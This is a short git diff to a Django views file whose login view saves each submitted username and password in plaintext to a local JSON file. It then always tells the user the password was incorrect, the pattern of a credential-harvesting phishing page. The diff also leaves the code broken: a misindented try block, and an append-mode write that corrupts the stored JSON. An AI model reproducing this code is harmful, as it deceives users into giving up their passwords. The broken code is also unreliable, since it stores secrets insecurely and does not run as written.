@@ -3,6 +3,7 @@
 from django.shortcuts import render
 from django.contrib import messages
 import json
+import os
 def index(request):
     return render(request, 'myapp/index.html', {'message': 'Hello, this is your app\'s index page.'})
 def login_view(request):
@@ -14,10 +15,11 @@ def login_view(request):
 
         # Save form data to the database
         user_data = {'username': username, 'password': password}
+        
         json_file_path = 'myapp\data.json'
+
         existing_data = []
-        existing_data = []
-        try:
+       try:
             with open(json_file_path, 'r') as json_file:
                 content = json_file.read()
                 if content:
@@ -28,8 +30,8 @@ def login_view(request):
         # Append new data to the existing data
         existing_data.append(user_data)
 
-        # Write the combined data (old + new) back to the JSON file
-        with open(json_file_path, 'w') as json_file:
+        # Write the combined data (old + new) back to the JSON file using append mode ('a')
+        with open(json_file_path, 'a') as json_file:
             json.dump(existing_data, json_file)
 
         success_message = 'Sorry, your password was incorrect. Please double-check your password.'
